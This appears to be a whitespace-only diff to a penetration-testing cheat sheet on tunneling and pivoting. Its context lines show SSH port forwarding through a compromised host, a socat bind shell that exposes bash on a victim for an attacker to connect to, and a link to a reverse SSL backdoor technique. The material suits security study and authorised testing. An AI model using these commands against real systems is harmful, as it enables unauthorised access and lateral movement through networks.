@@ -27,7 +27,7 @@ Local port --&gt; Compromised host \(SSH\) --&gt; Third\_box:Port
 ```bash
 ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host 
 #Example
-sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised> 
+sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
 ```
 
 ### Port2hostnet \(proxychains\)
@@ -150,7 +150,7 @@ victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntl
 
 ```bash
 victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
-attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337 
+attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
 ```
 
 ### Reverse shell
@@ -192,7 +192,7 @@ OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacke
 
 [https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)
 
-###  SSL Socat Tunnel
+### SSL Socat Tunnel
 
 **/bin/sh console**
 
@@ -246,7 +246,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
- It authenticates against a proxy and binds a port locally that is forwarded to the external service you specify. Then, you can use the tool of your choice through this port.  
+It authenticates against a proxy and binds a port locally that is forwarded to the external service you specify. Then, you can use the tool of your choice through this port.  
 Example that forward port 443
 
 ```text
